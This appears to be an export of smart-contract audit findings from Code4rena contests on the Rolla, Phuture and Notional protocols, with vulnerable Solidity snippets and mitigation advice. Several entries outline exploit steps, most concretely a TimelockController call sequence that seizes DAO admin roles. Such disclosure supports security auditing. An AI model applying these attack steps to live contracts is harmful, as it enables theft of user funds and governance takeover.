Failed txs should still increase the nonce.

While implementating the change above, consider adding one more check to require sufficient gas to be paid, to prevent ""insufficient gas griefing attack"" as described in [this article](https://ipfs.io/ipfs/QmbbYTGTeot9ic4hVrsvnvVuHw4b5P7F5SeMSNX9TYPGjY/blog/ethereum-gas-dangers/).




***"
98.md,No use of upgradeable SafeERC20 contract in `Controller.sol`,medium,"Controller.sol makes use of Open Zeppelins `ReentrancyGuardUpgradeable.sol` in the file but does not use an upgradeable version of SafeERC20.sol

### Proof of Concept

[Controller.sol#L5](https://github.com/code-423n4/2022-03-rolla/blob/main/quant-protocol/contracts/Controller.sol#L5)<br>

### Recommended Mitigation Steps

Make use of Open Zeppelins [upgradeable version of the SafeERC20.sol contract](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC20/utils/SafeERC20Upgradeable.sol).



***"
98.md,`COLLATERAL_MINTER_ROLE` can be granted by the deployer of `QuantConfig` and mint arbitrary amount of tokens,medium,"function mintCollateralToken(
            address recipient,
            uint256 collateralTokenId,
            uint256 amount
        ) external override {
            require(
                quantConfig.hasRole(
                    quantConfig.quantRoles(""COLLATERAL_MINTER_ROLE""),
                    msg.sender
                ),
                ""CollateralToken: Only a collateral minter can mint CollateralTokens""
            );

            emit CollateralTokenMinted(recipient, collateralTokenId, amount);

            _mint(recipient, collateralTokenId, amount, """");
        }

Using the mintCollateralToken() function of CollateralToken, an address with COLLATERAL_MINTER_ROLE can mint an arbitrary amount of tokens.

If the private key of the deployer or an address with the COLLATERAL_MINTER_ROLE is compromised, the attacker will be able to mint an unlimited amount of collateral tokens.

We believe this is unnecessary and poses a serious centralization risk.

### Proof of Concept

[CollateralToken.sol#L101-L117](https://github.com/code-423n4/2022-03-rolla/blob/main/quant-protocol/contracts/options/CollateralToken.sol#L101-L117)<br>
[CollateralToken.sol#L138-L160](https://github.com/code-423n4/2022-03-rolla/blob/main/quant-protocol/contracts/options/CollateralToken.sol#L138-L160)<br>

### Recommended Mitigation Steps

Consider removing the COLLATERAL_MINTER_ROLE, make the CollateralToken only mintable by the owner, and make the Controller contract to be the owner and therefore the only minter.




 > 
 > [RollaProject/quant-protocol#90](https://github.com/RollaProject/quant-protocol/pull/90)



***"
98.md,Usage of deprecated Chainlink functions,medium,"The Chainlink functions `latestAnswer()` and `getAnswer()` are deprecated. Instead, use the [`latestRoundData()`](https://docs.chain.link/docs/price-feeds-api-reference/#latestrounddata) and [`getRoundData()`](https://docs.chain.link/docs/price-feeds-api-reference/#getrounddata) functions.

### Proof of Concept

[ChainlinkOracleManager.sol#L120](https://github.com/code-423n4/2022-03-rolla/blob/main/quant-protocol/contracts/pricing/oracle/ChainlinkOracleManager.sol#L120)<br>

[ChainlinkFixedTimeOracleManager.sol#L81](https://github.com/code-423n4/2022-03-rolla/blob/main/quant-protocol/contracts/pricing/oracle/ChainlinkFixedTimeOracleManager.sol#L81)<br>

[ChainlinkFixedTimeOracleManager.sol#L84](https://github.com/code-423n4/2022-03-rolla/blob/main/quant-protocol/contracts/pricing/oracle/ChainlinkFixedTimeOracleManager.sol#L84)<br>

Go to <https://etherscan.io/address/0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419#code> and search for `latestAnswer()` or `getAnswer()`. You'll find the deprecation notice.

### Recommended Mitigation Steps

Switch to `latestRoundData()` as described [here](https://docs.chain.link/docs/price-feeds-api-reference/#latestrounddata).



***"
98.md,`ConfigTimeLockController` will put `QuantConfig` in a stalemate (rendering it unusable),medium,"The QuantConfig contract has these important setters, setProtocolAddress(), setProtocolUint256, setProtocolBoolean() and setProtocolRole(). This contract is subjected to a timelock before all such processes above are executed. But, the issue arises in the fact that in configTimeLockController, the state variable minimum delay can be set to an arbitrary value, up to type(uint256).max(cannot assume what value will be set) and could potentially render the QuantConfig contract unusable . All the previous values and addresses would not be able to be changed because of a very high delay being set:

[ConfigTimelockController.sol#L28](https://github.com/code-423n4/2022-03-rolla/blob/efe4a3c1af8d77c5dfb5ba110c3507e67a061bdd/quant-protocol/contracts/timelock/ConfigTimelockController.sol#L28)<br>

I discussed with one of the devs about the use of this specific mapping :

[QuantConfig.sol#L27](https://github.com/code-423n4/2022-03-rolla/blob/efe4a3c1af8d77c5dfb5ba110c3507e67a061bdd/quant-protocol/contracts/QuantConfig.sol#L27)<br>

After discussions with one of the devs(#0xca11.eth) , it was understood  that these values are for the rollaOrderFee which is a part of their limit order protocol contract(outside of the scope of the contest) but given the argument above,  its configuration will be severely impacted (old percentage fees won't be able to be changed).Rolla limit order protocol depends on this configuration setting within QuantConfig.

### Recommended Mitigation Steps

It is recommended that a constant be declared with a MAXIMUM_DELAY and whatever ‘minimum delay’ that is set thereafter should be below this value since there's another function setDelay () which can also be of high arbitrary value:

`require(minimum delay ≤MAXIMUM_DELAY, “ too high”)`

 > 
 > [RollaProject/quant-protocol#90](https://github.com/RollaProject/quant-protocol/pull/90)



***"
98.md,QTokens with the same symbol will lead to mistakes,medium,"The [`README.md`](https://github.com/code-423n4/2022-03-rolla/blob/efe4a3c1af8d77c5dfb5ba110c3507e67a061bdd/README.md?plain=1#L70) states:

> Bob can then trade the QToken with Alice for a premium. The method for doing that is beyond the scope of the protocol but can be done via any smart contract trading platform e.g. 0x.

It is therefore important that tokens be easily identifiable so that trading on DEXes is not error-prone.

### Impact

Currently the `QToken` `name` includes the full year but the `QToken` symbol only contains the last two digits of the year, which can lead to mistakes. If someone mints a QToken with an expiry 100 years into the future, then the year will be truncated and appear as if the token expired this year. Normal centralized exchanges prevent this by listing options themselves and ensuring that there are never two options with the same identifier at the same time. The Rolla protocol does not have any such protections. Users must be told to not only check that the symbol name is what they expect, but to also separately check the token name or the specific expiry, or they might buy the wrong option on a DEX, or have fat-fingered during minting on a non-Rolla web interface. It's important to minimize the possibility of mistakes, and not including the full year in the symbol makes things error-prone, and will lead to other options providers winning out.

The 0x [REST interface](https://docs.0x.org/0x-api-swap/api-references/get-swap-v1-quote) for swaps has the ability to do a swap by token name rather than by token address. I was unable to figure out whether there was an allow-list of token names, or if it is easy to add a new token. If there is no, or an easily bypassed, access-control for adding new tokens, I would say this finding should be upgraded to high-severity, though I doubt this is the case.

### Proof of Concept

```solidity
        /// concatenated symbol string
        tokenSymbol = string(
            abi.encodePacked(
                ""ROLLA"",
                ""-"",
                underlying,
                ""-"",
                _uintToChars(day),
                monthSymbol,
                _uintToChars(year),
                ""-"",
                displayStrikePrice,
                ""-"",
                typeSymbol
            )
        );
```

[QTokenStringUtils.sol#L115-L130](https://github.com/code-423n4/2022-03-rolla/blob/efe4a3c1af8d77c5dfb5ba110c3507e67a061bdd/quant-protocol/contracts/options/QTokenStringUtils.sol#L115-L130)<br>

```solidity
    /// @return 2 characters that correspond to a number
    function _uintToChars(uint256 _number)
        internal
        pure
        virtual
        returns (string memory)
    {
        if (_number > 99) {
            _number %= 100;
        }

        string memory str = Strings.toString(_number);

        if (_number < 10) {
            return string(abi.encodePacked(""0"", str));
        }

        return str;
    }
```

[QTokenStringUtils.sol#L181-L199](https://github.com/code-423n4/2022-03-rolla/blob/efe4a3c1af8d77c5dfb5ba110c3507e67a061bdd/quant-protocol/contracts/options/QTokenStringUtils.sol#L181-L199)<br>

### Recommended Mitigation Steps

Include the full year in the token's symbol.




***"
98.md,`OperateProxy.callFunction()` should check if the `callee` is a contract,medium,"[Controller.sol#L550-L558](https://github.com/code-423n4/2022-03-rolla/blob/efe4a3c1af8d77c5dfb5ba110c3507e67a061bdd/quant-protocol/contracts/Controller.sol#L550-L558)<br>

```solidity
    /// @notice Allows a sender/signer to make external calls to any other contract.
    /// @dev A separate OperateProxy contract is used to make the external calls so
    /// that the Controller, which holds funds and has special privileges in the Quant
    /// Protocol, is never the `msg.sender` in any of those external calls.
    /// @param _callee The address of the contract to be called.
    /// @param _data The calldata to be sent to the contract.
    function _call(address _callee, bytes memory _data) internal {
        IOperateProxy(operateProxy).callFunction(_callee, _data);
    }
```

[OperateProxy.sol#L10-L19](https://github.com/code-423n4/2022-03-rolla/blob/efe4a3c1af8d77c5dfb5ba110c3507e67a061bdd/quant-protocol/contracts/utils/OperateProxy.sol#L10-L19)<br>

```solidity
    function callFunction(address callee, bytes memory data) external override {
        require(
            callee != address(0),
            ""OperateProxy: cannot make function calls to the zero address""
        );

        (bool success, bytes memory returnData) = address(callee).call(data);
        require(success, ""OperateProxy: low-level call failed"");
        emit FunctionCallExecuted(tx.origin, returnData);
    }
```

As the `OperateProxy.sol#callFunction()` function not payable, we believe it's not the desired behavior to call a non-contract address and consider it a successful call.

For example, if a certain business logic requires a successful `token.transferFrom()` call to be made with the `OperateProxy`, if the `token` is not a existing contract, the call will return `success: true` instead of `success: false` and break the caller's assumption and potentially malfunction features or even cause fund loss to users.

The qBridge exploit (January 2022) was caused by a similar issue.

As a reference, OpenZeppelin's `Address.functionCall()` will check and `require(isContract(target), ""Address: call to non-contract"");`

<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.5.0/contracts/utils/Address.sol#L135>

```solidity
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, ""Address: insufficient balance for call"");
        require(isContract(target), ""Address: call to non-contract"");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }
```

<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.5.0/contracts/utils/Address.sol#L36-L42>

```solidity
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }
```

### Recommended Mitigation Steps

Consider adding a check and throw when the `callee` is not a contract.



***"
98.md,Low-level transfer via `call()` can fail silently,medium,"[TimelockController.sol#L414-L415](https://github.com/code-423n4/2022-03-rolla/blob/a06418c9cc847395f3699bdf684a9ac066651ed7/quant-protocol/contracts/timelock/TimelockController.sol#L414-L415)<br>

In the `_call()` function in `TimelockController.sol`, a call is executed with the following code:

    function _call(
            bytes32 id,
            uint256 index,
            address target,
            uint256 value,
            bytes memory data
        ) private {
            // solhint-disable-next-line avoid-low-level-calls
            (bool success, ) = target.call{value: value}(data);
            require(success, ""TimelockController: underlying transaction reverted"");

            emit CallExecuted(id, index, target, value, data);
        }

Per the Solidity docs:

""The low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed.""

Therefore, transfers may fail silently.

### Proof of Concept

Please find the documentation [here](https://docs.soliditylang.org/en/develop/control-structures.html#error-handling-assert-require-revert-and-exceptions).

### Recommended Mitigation Steps

Check for the account's existence prior to transferring.

 > 
 > [RollaProject/quant-protocol#90](https://github.com/RollaProject/quant-protocol/pull/90)



***"
98.md,Arbitrary code can be run with Controller as msg.sender,medium,"A malicious user can call Controller's operate with ActionType.QTokenPermit, providing a precooked contract address as qToken, that will be called by Controller contract with IQToken(\_qToken).permit(), which implementation can be arbitrary as long as IQToken interface and permit signature is implemented.

The Controller is asset bearing contract and it will be msg.sender in this arbitrary permit() function called, which is a setup that better be avoided.

### Proof of Concept

When the Controller's operate with a QTokenPermit action, it parses the arguments with Actions library and then calls internal \_qTokenPermit:

[Controller.sol#L91-L92](https://github.com/code-423n4/2022-03-rolla/blob/main/quant-protocol/contracts/Controller.sol#L91-L92)<br>

\_qTokenPermit calls the IQToken(\_qToken) address provided without performing any additional checks:

[Controller.sol#L497-L516](https://github.com/code-423n4/2022-03-rolla/blob/main/quant-protocol/contracts/Controller.sol#L497-L516)<br>

This way, contrary to the approach used in other actions, qToken isn't checked to be properly created address and is used right away, while the requirement that the address provided should implement IQToken interface and have permit function with a given signature can be easily met with a precooked contract.

### Recommended Mitigation Steps

Given that QToken can be called directly please examine the need for QTokenPermit ActionType.

If current approach is based on UI convenience and better be kept, consider probing for IOptionsFactory(optionsFactory).isQToken(\_qToken) before calling the address provided.




***"
98.md,Spreads can be minted with a deactivated oracle,medium,"When deactivateOracle() is called for an oracle in OracleRegistry it is still available for option spreads minting.

This way a user can continue to mint new options within spreads that rely on an oracle that was deactivated. As economic output of spreads is close to vanilla options, so all users who already posses an option linked to a deactivated oracle can surpass this deactivation, being able to mint new options linked to it as a part of option spreads.

### Proof of Concept

Oracle active state is checked with isOracleActive() during option creation in validateOptionParameters() and during option minting in \_mintOptionsPosition().

It isn't checked during spreads creation:

[FundsCalculator.sol#L91-L117](https://github.com/code-423n4/2022-03-rolla/blob/main/quant-protocol/contracts/libraries/FundsCalculator.sol#L91-L117)<br>

In other words besides vanilla option minting and creation all spectrum of operations is available for the deactivated oracle assets, including spreads minting, which economically is reasonably close to vanilla minting.

### Recommended Mitigation Steps

If oracle deactivation is meant to transfer all related assets to the close only state then consider requiring oracle to be active on spreads minting as well in the same way it's done for vanilla option minting:

[Controller.sol#L188-L197](https://github.com/code-423n4/2022-03-rolla/blob/main/quant-protocol/contracts/Controller.sol#L188-L197)<br>



***"
98.md,Admin of the upgradeable proxy contract of `Controller.sol` can rug users,medium,"[Controller.sol#L22-L34](https://github.com/code-423n4/2022-03-rolla/blob/a06418c9cc847395f3699bdf684a9ac066651ed7/quant-protocol/contracts/Controller.sol#L22-L34)<br>

Use of Upgradeable Proxy Contract Structure allows the logic of the contract to be arbitrarily changed.

This allows the proxy admin to perform malicious actions e.g., taking funds from users' wallets up to the allowance limit.

This action can be performed by the malicious/compromised proxy admin without any restriction.

Considering that the purpose of this particular contract is for accounting of the Collateral and LongShortTokens, we believe the users' allowances should not be hold by this upgradeable contract.

### Proof of Concept

Given:

*   collateral: `USDC`

#### Rug Users' Allowances

1.  Alice `approve()` and `_mintOptionsPosition()` with `1e8 USDC`;
2.  Bob  `approve()` and `_mintOptionsPosition()` with `5e8 USDC`;
3.  A malicious/compromised proxy admin can call `upgradeToAndCall()` on the proxy contract and set a malicious contract as `newImplementation` and stolen all the USDC in Alice and Bob's wallets;

#### Rug Contract's Holdings (funds that belong to users)

A malicious/compromised proxy admin can just call `upgradeToAndCall()` on the proxy contract and send all the USDC held by the contract to an arbitrary address.

### Severity

A smart contract being structured as an upgradeable contract alone is not usually considered as a high severity risk. But given the severe impact (all the funds in the contract and funds in users' wallets can be stolen), we mark it as a `High` severity issue.

### Recommended Mitigation Steps

Consider using the non-upgradeable `CollateralToken` contract to hold user's allowances instead.

See also our Recommendation in \[issue #49](https://github.com/code-423n4/2022-03-rolla-findings/issues/49).





***"
90.md,`IndexLogic`: An attacker can mint tokens for himself using assets deposited by other users,high,"In the mint function of the IndexLogic contract, users are required to transfer assets to vToken in advance, and then call the mint function to mint tokens.
The attacker can monitor the asset balance in the vToken contract. When the balance is greater than lastBalance, the attacker can call the mint function to mint tokens for himself.

### Proof of Concept

[IndexLogic.sol#L48](https://github.com/code-423n4/2022-04-phuture/blob/main/contracts/IndexLogic.sol#L48)<br>

### Recommended Mitigation Steps

Call the transferfrom function in the mint function of the IndexLogic contract to transfer the user's assets.





> `
> We would like wardens to focus on any core functional logic, boundary case errors or similar issues which could be utilized by an attacker to take funds away from clients who have funds deposited in the protocol.
> `<br>

> This a core logic error that could be used to take funds away from clients and given there is no mention of the router and only part of the code is submitted, I am siding with the wardens on this and awarding in full.



***"
90.md,`UniswapV2PriceOracle.sol` `currentCumulativePrices()` will revert when `priceCumulative` addition overflow,high,"[UniswapV2PriceOracle.sol#L62](https://github.com/code-423n4/2022-04-phuture/blob/594459d0865fb6603ba388b53f3f01648f5bb6fb/contracts/UniswapV2PriceOracle.sol#L62)<br>

```solidity
(uint price0Cumulative, uint price1Cumulative, uint32 blockTimestamp) = address(pair).currentCumulativePrices();
```

Because the Solidity version used by the current implementation of `UniswapV2OracleLibrary.sol` is `>=0.8.7`, and there are some breaking changes in Solidity v0.8.0:

> Arithmetic operations revert on underflow and overflow.

Ref: <https://docs.soliditylang.org/en/v0.8.13/080-breaking-changes.html#silent-changes-of-the-semantics>

While in `UniswapV2OracleLibrary.sol`, subtraction overflow is desired at `blockTimestamp - blockTimestampLast` in `currentCumulativePrices()`:

<https://github.com/Uniswap/v2-periphery/blob/master/contracts/libraries/UniswapV2OracleLibrary.sol#L25-L33>

```solidity
if (blockTimestampLast != blockTimestamp) {
    // subtraction overflow is desired
    uint32 timeElapsed = blockTimestamp - blockTimestampLast;
    // addition overflow is desired
    // counterfactual
    price0Cumulative += uint(FixedPoint.fraction(reserve1, reserve0)._x) * timeElapsed;
    // counterfactual
    price1Cumulative += uint(FixedPoint.fraction(reserve0, reserve1)._x) * timeElapsed;
}
```

In another word, `Uniswap/v2-periphery/contracts/libraries/UniswapV2OracleLibrary` only works at solidity < `0.8.0`.

As a result, when `price0Cumulative` or `price1Cumulative` is big enough, `currentCumulativePrices` will revert due to overflow.

### Impact

Since the overflow is desired in the original version, and it's broken because of using Solidity version >0.8. The `UniswapV2PriceOracle` contract will break when the desired overflow happens, and further breaks other parts of the system that relies on `UniswapV2PriceOracle`.

### Recommended Mitigation Steps

Note: this recommended fix requires a fork of the library contract provided by Uniswap.

Change to:

```solidity
if (blockTimestampLast != blockTimestamp) {
    unchecked {
        // subtraction overflow is desired
        uint32 timeElapsed = blockTimestamp - blockTimestampLast;
        // addition overflow is desired
        // counterfactual
        price0Cumulative += uint(FixedPoint.fraction(reserve1, reserve0)._x) * timeElapsed;
        // counterfactual
        price1Cumulative += uint(FixedPoint.fraction(reserve0, reserve1)._x) * timeElapsed;
    }
}
```





***"
90.md,Index managers can rug user funds,medium,"The `ORDERER_ROLE` role has the ability to arbitrarily transfer user funds, and this role is shared between both the `orderer` and people who can rebalance the index.

Even if the owner is benevolent the fact that there is a rug vector available may [negatively impact the protocol's reputation](https://twitter.com/RugDocIO/status/1411732108029181960). See [this](https://github.com/code-423n4/2021-08-realitycards-findings/issues/73) example where a similar finding has been flagged as a high-severity issue. I've downgraded this instance to be a medium since it requires a malicious manager.

### Proof of Concept

The role is given to the `orderer` so it has the ability to add/remove funds during Uniswap operations:
File: contracts/vToken.sol (lines [80-87](https://github.com/code-423n4/2022-04-phuture/blob/594459d0865fb6603ba388b53f3f01648f5bb6fb/contracts/vToken.sol#L80-L87))

```solidity
    /// @inheritdoc IvToken
    function transferFrom(
        address _from,
        address _to,
        uint _shares
    ) external override nonReentrant onlyRole(ORDERER_ROLE) {
        _transfer(_from, _to, _shares);
    }
```

The role is also required to initiate rebalances:
File: contracts/TopNMarketCapIndex.sol (lines [67-68](https://github.com/code-423n4/2022-04-phuture/blob/47cd226c80842585542599a3b56cc2a26b519d8a/contracts/TopNMarketCapIndex.sol#L67-L68))

```solidity
    /// @notice Reweighs index assets according to the latest market cap data for specified category
    function reweight() external override onlyRole(ORDERER_ROLE) {
```

File: contracts/TrackedIndex.sol (lines [56-57](https://github.com/code-423n4/2022-04-phuture/blob/47cd226c80842585542599a3b56cc2a26b519d8a/contracts/TrackedIndex.sol#L56-L57))

```solidity
    /// @notice Reweighs index assets according to the latest market cap data
    function reweight() external override onlyRole(ORDERER_ROLE) {
```

It is not necessary for the person/tool initiating reweights to also have the ability to arbitrarily transfer funds, so they should be separate roles. If the `orderer` also needs to be able to reweight, the `orderer` should also be given the new role.

### Recommended Mitigation Steps

Split the role into two, and only give the `ORDERER_ROLE` role to the `orderer`.







***"
90.md,Chainlink's `latestRoundData` might return stale or incorrect results,medium,"naz, IllIllI, jah, kebabsec, kenta, pedroais, peritoflores, rayn, reassor, tabish, and WatchPug_

On ChainlinkPriceOracle.sol, we are using latestRoundData, but there is no check if the return value indicates stale data.

            (, int basePrice, , , ) = baseAggregator.latestRoundData();
            (, int quotePrice, , , ) = assetInfo.aggregator.latestRoundData();

This could lead to stale prices according to the Chainlink documentation:

<https://docs.chain.link/docs/historical-price-data/#historical-rounds><br>
<https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round>

### Proof of Concept

[ChainlinkPriceOracle.sol#L83-L84](https://github.com/code-423n4/2022-04-phuture/blob/main/contracts/ChainlinkPriceOracle.sol#L83-L84)<br>

### Recommended Mitigation Steps

Consider adding missing checks for stale data.

For example:

        (uint80 baseRoundID, int256 basePrice, , uint256 baseTimestamp, uint80 BaseAnsweredInRound) = baseAggregator.latestRoundData();
        (uint80 quoteRoundID, int256 quotePrice, , uint256 quoteTimestamp, uint80 quoteAnsweredInRound) = assetInfo.aggregator.latestRoundData();
        require(BaseAnsweredInRound >= baseRoundID && quoteAnsweredInRound >=  quoteRoundID, ""Stale price"");
        require(baseTimestamp != 0 && quoteTimestamp != 0 ,""Round not complete"");
        require(basePrice > 0 && quotePrice > 0,""Chainlink answer reporting 0"");






***"
90.md,Inactive skipped assets can be drained from the index,medium,"If an index has any inactive assets with the role `SKIPPED_ASSET_ROLE`, a user can repeatedly deposit and withdraw assets, always getting the skipped asset without having to deposit any

### Proof of Concept

During minting, any asset that has the 'skipped' role is excluded from the checks of assets deposited:
File: contracts/IndexLogic.sol (lines [60-70](https://github.com/code-423n4/2022-04-phuture/blob/594459d0865fb6603ba388b53f3f01648f5bb6fb/contracts/IndexLogic.sol#L60-L70))

```solidity
        for (uint i; i < inactiveAssets.length(); ++i) {
            if (!IAccessControl(registry).hasRole(SKIPPED_ASSET_ROLE, inactiveAssets.at(i))) {
                uint lastBalanceInAsset = IvToken(
                    IvTokenFactory(vTokenFactory).createOrReturnVTokenOf(inactiveAssets.at(i))
                ).lastAssetBalanceOf(address(this));
                lastAssetBalanceInBase += lastBalanceInAsset.mulDiv(
                    FixedPoint112.Q112,
                    oracle.refreshedAssetPerBaseInUQ(inactiveAssets.at(i))
                );
            }
        }
```

During burning, however, there's a bug that only skips if there are 'blacklisted' assets:
File: contracts/IndexLogic.sol (lines [125-140](https://github.com/code-423n4/2022-04-phuture/blob/594459d0865fb6603ba388b53f3f01648f5bb6fb/contracts/IndexLogic.sol#L125-L140))

```solidity
        for (uint i; i < length + inactiveAssets.length(); ++i) {
            address asset = i < length ? assets.at(i) : inactiveAssets.at(i - length);
            if (containsBlacklistedAssets && IAccessControl(registry).hasRole(SKIPPED_ASSET_ROLE, asset)) {
                continue;
            }

            IvToken vToken = IvToken(IvTokenFactory(vTokenFactory).vTokenOf(asset));
            uint indexAssetBalance = vToken.balanceOf(address(this));
            uint accountBalance = (value * indexAssetBalance) / totalSupply();
            if (accountBalance == 0) {
                continue;
            }

            // calculate index value in vault to be burned
            vToken.transfer(address(vToken), accountBalance);
            vToken.burn(_recipient);
```

This means that users will be passed back inactive skipped assets even if they never deposited any.

### Recommended Mitigation Steps

I believe the `&&` was meant to be a `||` in the `SKIPPED_ASSET_ROLE` in the code block directly above. Changing the code to be that way would be the fix.







***"
90.md,Wrong requirement in reweight function (`ManagedIndexReweightingLogic.sol`),medium,"[ManagedIndexReweightingLogic.sol#L32](https://github.com/code-423n4/2022-04-phuture/blob/594459d0865fb6603ba388b53f3f01648f5bb6fb/contracts/ManagedIndexReweightingLogic.sol#L32)<br>
[IIndexRegistry.sol#L19](https://github.com/code-423n4/2022-04-phuture/blob/594459d0865fb6603ba388b53f3f01648f5bb6fb/contracts/interfaces/IIndexRegistry.sol#L19)<br>

The list of assets won't be changed after reweight because of reverted tx.

### Proof of Concept

`require(_updatedAssets.length <= IIndexRegistry(registry).maxComponents())`
when [reweight](https://github.com/code-423n4/2022-04-phuture/blob/594459d0865fb6603ba388b53f3f01648f5bb6fb/contracts/ManagedIndexReweightingLogic.sol#L32) is not true, because as in the [doc](https://github.com/code-423n4/2022-04-phuture/blob/594459d0865fb6603ba388b53f3f01648f5bb6fb/contracts/interfaces/IIndexRegistry.sol#L19),
`maxComponent` is the maximum assets for an index, but `_updatedAssets` also contain the assets that you want to remove. So the comparision makes no sense.

### Recommended Mitigation Steps

Require `assets.length() <= IIndexRegistry(registry).maxComponents()` at the end of function instead.





***"
90.md,Asset Manager can update existing `_assetAggregator`,medium,"[ChainlinkPriceOracle.sol#L60](https://github.com/code-423n4/2022-04-phuture/blob/main/contracts/ChainlinkPriceOracle.sol#L60)<br>

Asset Manager can update the aggregator of an existing asset thus impacting all function making use of this asset. Ideally if an aggregator is already set for an asset the function should fail.

### Proof of Concept

1.  Asset Manager call function addAsset to adds an asset X with assetAggregator value as Y
2.  This is being utilized across application
3.  Now Asset Manager calls the same function addAsset with  asset X with assetAggregator value as Z
4.  Asset aggregator value for asset X gets changed to Z even though it was already set to Y

### Recommended Mitigation Steps

addAsset should only work if assetInfoOf\[\_asset] value is empty.







***"
90.md,Duplicate asset can be added,medium,"[ManagedIndex.sol#L35](https://github.com/code-423n4/2022-04-phuture/blob/main/contracts/ManagedIndex.sol#L35)<br>
[TopNMarketCapIndex.sol#L57](https://github.com/code-423n4/2022-04-phuture/blob/main/contracts/TopNMarketCapIndex.sol#L57)<br>
[TrackedIndex.sol#L45](https://github.com/code-423n4/2022-04-phuture/blob/main/contracts/TrackedIndex.sol#L45)<br>

Initialize function can be called multiple times with same asset. Calling with same asset will make duplicate entries in assets list. Any function reading assets will get impacted and would retrieve duplicate asset

### Proof of Concept

1.  Observe that initialize function can be called multiple times
2.  Admin calls initialize function with asset X
3.  asset X gets added in assets object
4.  Admin again calls initialize function with asset X
5.  asset X again gets added in assets object making duplicate entries

### Recommended Mitigation Steps

Add a check to fail if assets already contains the passed asset argument. Also add a modifier so that initialize could only be called once.

    require(!assets.contain(asset), ""Asset already exists"");







***"
90.md,Tokens with fee on transfer are not supported,medium,"There are ERC20 tokens that charge fee for every transfer() / transferFrom().

Vault.sol#addValue() assumes that the received amount is the same as the transfer amount,
and uses it to calculate attributions, balance amounts, etc.
But, the actual transferred amount can be lower for those tokens.

### Recommended Mitigation Steps

Therefore it's recommended to use the balance change before and after the transfer instead of the amount.
This way you also support the tokens with transfer fee - that are popular.

[IndexLogic.sol#L115](https://github.com/code-423n4/2022-04-phuture/tree/main/contracts/IndexLogic.sol#L115)<br>





***"
90.md,Wrong `shareChange()` function (`vToken.sol`),medium,"[vToken.sol#L160](https://github.com/code-423n4/2022-04-phuture/blob/594459d0865fb6603ba388b53f3f01648f5bb6fb/contracts/vToken.sol#L160)<br>

Users can get the wrong amount of vToken<br>
\=> Make users lose their fund

### Proof of Concept

Base on the code in function `shareChange()` in [vToken.sol](https://github.com/code-423n4/2022-04-phuture/blob/main/contracts/vToken.sol)<br>
Assume that if `oldShare = totalSupply > 0`,

*   `newShares`

\= `(_amountInAsset * (_totalSupply - oldShares)) / (_assetBalance - availableAssets);`<br>
\= `(_amountInAsset * (_totalSupply - _totalSupply)) / (_assetBalance - availableAssets);`<br>
\= `0`<br>

It make no sense, because if `amountInAsset >> availableAssets`, `newShares` should be bigger than `oldShares`, but in this case `newShares = 0 < oldShares`

### Recommended Mitigation Steps

Modify the [line](https://github.com/code-423n4/2022-04-phuture/blob/594459d0865fb6603ba388b53f3f01648f5bb6fb/contracts/vToken.sol#L160) from `if (_totalSupply > 0)` to `if (_totalSupply - oldShares > 0)`.








***"
23.md,Self transfer can lead to unlimited mint,high,"The implementation of the transfer function in [`nTokenAction.sol`]( https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/actions/nTokenAction.sol) is different from the usual erc20 token transfer function.

 This happens because it counts the incentive that the user gets, but with a self-transfer,  it can lead to unlimited mint. In [L278](https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/actions/nTokenAction.sol#_L278), it makes the amount negative, but in [L279](https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/actions/nTokenAction.sol#L279), it returns the value to an amount that is not negative. So, in the [L281-282](https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/actions/nTokenAction.sol#L281-282), it finalizes a positive value, only because the negative value is changed to the positive value.

 You can interact with this transfer function through [nTokenERC20Proxy.sol](https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/adapters/nTokenERC20Proxy.sol).

Recommend adding `(sender != recipient)`."
23.md,DAO proposals can be executed by anyone due to vulnerable `TimelockController`,high,"The `GovernorAlpha` inherits from a vulnerable `TimelockController`.
This `TimelockController` allows an `EXECUTOR` role to escalate privileges and also gain the proposer role. See details on [OZ](https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-fg47-3c2x-m2wr) and the [fix here](https://github.com/OpenZeppelin/openzeppelin-contracts/compare/v4.3.0...v4.3.1).

The bug is that `_executeBatch` checks if the proposal was scheduled only **after** the transactions have been executed. This allows inserting a call into the batch that schedules the batch itself, and the entire batch will succeed.
As the custom `GovernorAlpha.executeProposal` function removed the original ""queued state check"" (`require(state(proposalId) == ProposalState.Queued`), the attack can be executed by anyone, even without the `EXEUCTOR_ROLE`.

**Proof of concept**:
1. Create a proposal using `propose`. The `calldata` will be explained in the next step. (This can be done by anyone passing the min `proposalThreshold`)
2. Call `executeProposal(proposalId, ...)` such that the following calls are made:

```solidity
call-0: grantRole(TIME_LOCK_ADMIN, attackerContract)
call-1: grantRole(EXECUTOR, attackerContract)
call-2: grantRole(PROPOSER, attackerContract)
call-3: updateDelay(0) // such that _afterCall ""isOperationReady(id): timestamp[id] = block.timestamp + minDelay (0) <= block.timestamp"" passes
call-4: attackerContract.hello() // this calls timelock.schedule(args=[targets, values, datas, ...]) where args were previously already stored in contract. (this is necessary because id depends on this function's args and we may not be self-referential)
// attackerContract is proposer & executor now and can directly call scheduleBatch & executeBatch without having to create a proposal
```

> ℹ️  I already talked to Jeff Wu about this and he created a test case for it confirming this finding

The impact is that, anyone who can create a proposal can become `Timelock` admin (proposer & executor) and execute arbitrary transactions as the DAO-controlled `GovernorAlpha`.
Note that this contract has severe privileges and an attacker can now do anything that previously required approval of the DAO. For example, they could update the `globalTransferOperator` and steal all tokens.

